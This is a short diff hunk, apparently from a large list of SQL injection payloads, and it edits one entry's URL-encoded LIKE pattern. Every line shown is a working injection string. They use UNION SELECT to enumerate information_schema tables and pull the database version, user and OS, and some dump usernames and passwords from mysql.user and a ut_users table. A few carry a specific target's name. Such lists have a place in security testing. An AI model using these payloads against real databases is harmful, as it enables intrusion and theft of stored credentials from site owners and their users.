@@ -11186,7 +11186,7 @@
 -641 union select 1,2,3,table_name,5 from information_schema.tables limit 17,1--
 -6421 union select 1,2,concat_ws(0x3a,version(),database(),user(),@@version_compile_os)-- 
 -6422 union select 1,2,3,4,user,password,7,8 from mysql.user/*
-'642' AND (version() like '%254.0.26%25') and (user() like '%restconcaravanru%') and (database() like '%restconcaravanru%25') -- 
+'642' AND (version() like '%254.0.26%25') and (user() like '%25restconcaravanru%') and (database() like '%restconcaravanru%25') -- 
 -642' union select 1,concat_ws(char(58),UserID,Login,Password),3,4,5,6,7,8 from ut_users/*
 -6431 union select 1,group_concat(table_name),3,4,5,6,7,8,9,0,1,2,3,4,5,6,7 from information_schema.tables --
 -643 union select 1,2,3,4,5,6,7,8,9,10,concat_ws(0x3a,user(),version(),database(),@@version_compile_os),12,13,14,15,16,17-- 
